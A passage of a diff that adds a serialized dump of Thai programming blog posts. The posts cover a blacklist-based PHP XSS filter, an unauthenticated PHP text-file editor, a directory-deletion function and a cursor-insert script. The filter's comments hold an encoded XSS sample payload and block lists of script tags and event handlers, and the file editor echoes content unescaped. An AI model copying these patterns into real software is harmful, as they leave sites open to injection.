@@ -1,0 +1,540 @@
+a:4:{s:6:"record";a:10:{i:0;a:6:{s:10:"content_id";s:2:"25";s:11:"category_id";s:1:"1";s:12:"content_name";s:101:"มาป้องกัน Cross-Site scripting อันร้ายกาจกันครับ ";s:15:"content_summary";s:810:"<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</x></x></p>
+<p><x><x><br />
+</x></x></p>";s:14:"content_detail";s:6396:"<p><b>เอาไปเลยครับ sc<x>ript </x></b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \n \r and \t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace('/([\x00-\x08\x0b-\x0c\x0e-\x19])/' '' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they're normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = 'abcdefghijklmnopqrstuvwxyz';<br />
+&nbsp;&nbsp; $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';<br />
+&nbsp;&nbsp; $search .= '1234567890!@#$%^&amp;*()';<br />
+&nbsp;&nbsp; $search .= '~`&quot;;:?+/={}[]-_|\'\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace('/(&amp;#[xX]0{08}'.dechex(ord($search[$i])).';?)/i' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches '0' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace('/(&amp;#0{08}'.ord($search[$i]).';?)/' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \t \n and \r<br />
+&nbsp;&nbsp; $ra1 = Array('ja<x>vasc<x>ript' 'vb<x>sc<x>ript' 'ex<x>pression' 'ap<x>plet' 'me<x>ta' 'xm<x>l' 'bl<x>ink' 'li<x>nk' 'st<x>yle' 'sc<x>ript' 'em<x>bed' 'ob<x>ject' 'if<x>rame' 'fr<x>ame' 'fr<x>ameset' 'il<x>ayer' 'la<x>yer' 'bg<x>sound' 'ti<x>tle' 'ba<x>se');<br />
+&nbsp;&nbsp; $ra2 = Array('on<x>abort' 'on<x>activate' 'on<x>afterprint' 'on<x>afterupdate' 'on<x>beforeactivate' 'on<x>beforecopy' 'on<x>beforecut' 'on<x>beforedeactivate' 'on<x>beforeeditfocus' 'on<x>beforepaste' 'on<x>beforeprint' 'on<x>beforeunload' 'on<x>beforeupdate' 'on<x>blur' 'on<x>bounce' 'on<x>cellchange' 'on<x>change' 'on<x>click' 'on<x>contextmenu' 'on<x>controlselect' 'on<x>copy' 'on<x>cut' 'on<x>dataavailable' 'on<x>datasetchanged' 'on<x>datasetcomplete' 'on<x>dblclick' 'on<x>deactivate' 'on<x>drag' 'on<x>dragend' 'on<x>dragenter' 'on<x>dragleave' 'on<x>dragover' 'on<x>dragstart' 'on<x>drop' 'on<x>error' 'on<x>errorupdate' 'on<x>filterchange' 'on<x>finish' 'on<x>focus' 'on<x>focusin' 'on<x>focusout' 'on<x>help' 'on<x>keydown' 'on<x>keypress' 'on<x>keyup' 'on<x>layoutcomplete' 'on<x>load' 'on<x>losecapture' 'on<x>mousedown' 'on<x>mouseenter' 'on<x>mouseleave' 'on<x>mousemove' 'on<x>mouseout' 'on<x>mouseover' 'on<x>mouseup' 'on<x>mousewheel' 'on<x>move' 'on<x>moveend' 'on<x>movestart' 'on<x>paste' 'on<x>propertychange' 'on<x>readystatechange' 'on<x>reset' 'on<x>resize' 'on<x>resizeend' 'on<x>resizestart' 'on<x>rowenter' 'on<x>rowexit' 'on<x>rowsdelete' 'on<x>rowsinserted' 'on<x>scroll' 'on<x>select' 'on<x>selection<x>change' 'on<x>selectstart' 'on<x>start' 'on<x>stop' 'on<x>submit' 'on<x>unload');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = '/';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= '(';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= '(&amp;#[xX]0{08}([9ab]);)';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= '|';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= '|(&amp;#0{08}([9|10|13]);)';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= ')*';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= '/i';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).'&lt;x&gt;'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></x></p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>";s:9:"post_date";s:10:"2009-03-11";}i:1;a:6:{s:10:"content_id";s:2:"17";s:11:"category_id";s:1:"1";s:12:"content_name";s:92:"PHP กับการ อ่านเขียน Text Files อย่างง่ายๆ";s:15:"content_summary";s:362:"<p><img height="64" alt="" width="111" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/php.jpg" />ตัวอย่างง่ายๆ โดยอ่าน Text File เข้าไปเก็บใน textarea <br />
+แล้วก็เอาค่าจาก textarea เก็บลง Text File เหมือนเดิม</p>";s:14:"content_detail";s:2973:"<h3><span style="color: #ff0000">พอดีมีเพื่อนท่านนึงให้ช่วย เห็นว่าน่าจะมีประโยชน์สำหรับผู้เริ่มต้นบางท่าน</span></h3>
+<p>&lt;?php<br />
+$path&nbsp;&nbsp;&nbsp;&nbsp; = &quot;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //ระบุ path ถ้าไฟล์อยู่ใน path เดียวกับไฟล์นี้ไม่ต้องใส่ก็ได้<br />
+$file_name = &quot;MyLogFile.txt&quot;; //ชื่อไฟล์<br />
+$filename&nbsp;&nbsp;&nbsp;&nbsp; = $path.$file_name;<br />
+<br />
+Echo &quot;Working with ==&gt;&nbsp; &quot;.$filename;<br />
+<br />
+if ($_POST)<br />
+{<br />
+&nbsp;&nbsp; Write_File($filename,$_POST['contents']); <br />
+}<br />
+<br />
+$str = Read_File($filename);<br />
+?&gt;<br />
+<br />
+&lt;form method=&quot;post&quot;&gt;<br />
+&lt;textarea name=&quot;contents&quot; cols=&quot;100&quot; rows=&quot;10&quot;&gt;&lt;?=$str?&gt;&lt;/textarea&gt;<br />
+&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;Overwrite This File&quot; onclick=&quot;return confirm('Do you want to overwrite this file');&quot;&gt;<br />
+&lt;/form&gt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+&lt;?<br />
+//=====================File Manupulation Function======================//<br />
+<br />
+function Write_File($filename,$content)<br />
+{<br />
+&nbsp;&nbsp;&nbsp; if (is_writable($filename)) {<br />
+<br />
+&nbsp;&nbsp;&nbsp; if (!$handle = fopen($filename, 'w+')) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;&lt;br&gt;&lt;font color='red' size='3'&gt;Cannot open file ($filename)&lt;/font&gt;&lt;BR&gt;&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit;<br />
+&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp; &nbsp;if (fwrite($handle, $content) === FALSE) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo &quot;&lt;br&gt;&lt;font color='red' size='3'&gt;Cannot write to file ($filename)&lt;/font&gt;&lt;BR&gt;&quot;;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit;<br />
+&nbsp;&nbsp;&nbsp; }<br />
+<br />
+&nbsp;&nbsp;&nbsp; echo &quot;&lt;br&gt;&lt;font color='green' size='3'&gt;Overwrite $filename is Successful&lt;/font&gt;&lt;BR&gt;&quot;;<br />
+<br />
+<br />
+&nbsp;&nbsp;&nbsp; fclose($handle);<br />
+} else {<br />
+&nbsp;&nbsp;&nbsp; echo &quot;&lt;br&gt;&lt;font color='red' size='3'&gt;The file $filename is not writable&lt;/font&gt;&lt;BR&gt;&quot;;<br />
+}<br />
+}<br />
+<br />
+function Read_File($filename)<br />
+{&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp; $handle = fopen($filename, &quot;r&quot;);<br />
+&nbsp;&nbsp;&nbsp; &nbsp;if (filesize($filename)) $contents = fread($handle, filesize($filename));<br />
+&nbsp;&nbsp;&nbsp; fclose($handle);<br />
+&nbsp;&nbsp;&nbsp; return $contents;<br />
+}<br />
+<br />
+?&gt;</p>";s:9:"post_date";s:10:"2009-02-12";}i:2;a:6:{s:10:"content_id";s:2:"16";s:11:"category_id";s:1:"1";s:12:"content_name";s:91:"ลบ directory ที่มีไฟล์หรือ directory ย่อยอยู่";s:15:"content_summary";s:339:"<p><img height="64" width="111" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/php.jpg" alt="" /></p>
+<p>ใครเคยพยายามลบ directory ที่มีไฟล์หรือ directory ย่อยอยู่ไม่ได้บ้างลองนี่ไปใช้ดูครับ</p>";s:14:"content_detail";s:775:"<p>ลบ directory ที่มีไฟล์หรือ directory ย่อยอยู่</p>
+<p>function deldir($dir){<br />
+&nbsp; $current_dir = opendir($dir);<br />
+&nbsp; while($entryname = readdir($current_dir)){<br />
+&nbsp;&nbsp;&nbsp;&nbsp; if(is_dir(&quot;$dir/$entryname&quot;) and ($entryname != &quot;.&quot; and $entryname!=&quot;..&quot;)){<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $this-&gt;deldir(&quot;${dir}/${entryname}&quot;);<br />
+&nbsp;&nbsp;&nbsp;&nbsp; }elseif($entryname != &quot;.&quot; and $entryname!=&quot;..&quot;){<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; unlink(&quot;${dir}/${entryname}&quot;);<br />
+&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp; }<br />
+&nbsp; closedir($current_dir);<br />
+&nbsp; rmdir(${dir});<br />
+}</p>";s:9:"post_date";s:10:"2009-02-11";}i:3;a:6:{s:10:"content_id";s:2:"15";s:11:"category_id";s:1:"6";s:12:"content_name";s:75:"Java Script แทรกข้อความที่ cursor อยู่ ";s:15:"content_summary";s:198:"<p><img height="97" alt="" width="128" src="http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/java.jpg" /></p>
+<p>คลิกเข้าไปดูกันเลยครับ</p>";s:14:"content_detail";s:16804:"<h3><span style="color: #ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; script ที่น่าใช้อีกตัวนึง คิดว่าน่าจะมีโอกาสเอาไปใช้กันได้เยอะนะครับ</span></h3>
+<p><br />
+&lt;script&gt;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var elementName=&quot;&quot;;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function&nbsp; setElement(ele){<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elementName=ele.name;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; }<br style="background-color: rgb(192,192,192)" />
+<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;function insertToBody() {<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; var tag=document.getElementById('variables').value;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var myField;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; if (elementName == &quot;&quot; ){<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; return false;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; }<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;myField = document.getElementById(elementName);&nbsp;&nbsp;&nbsp; <br style="background-color: rgb(192,192,192)" />
+<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if (document.selection) {<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.focus();<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; sel = document.selection.createRange();<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; sel.text = tag;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.focus();<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else if (myField.selectionStart || myField.selectionStart == '0') {<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; var startPos = myField.selectionStart;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; var endPos = myField.selectionEnd;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; var cursorPos = endPos;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.value = myField.value.substring(0, startPos)<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; + tag<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; + myField.value.substring(endPos, myField.value.length);<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; cursorPos += tag.length;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.focus();<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.selectionStart = cursorPos;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.selectionEnd = cursorPos;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;}<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else {<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.value += tag;<br style="background-color: rgb(192,192,192)" />
+&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; myField.focus();<br style="background-color: rgb(192,192,192)" />
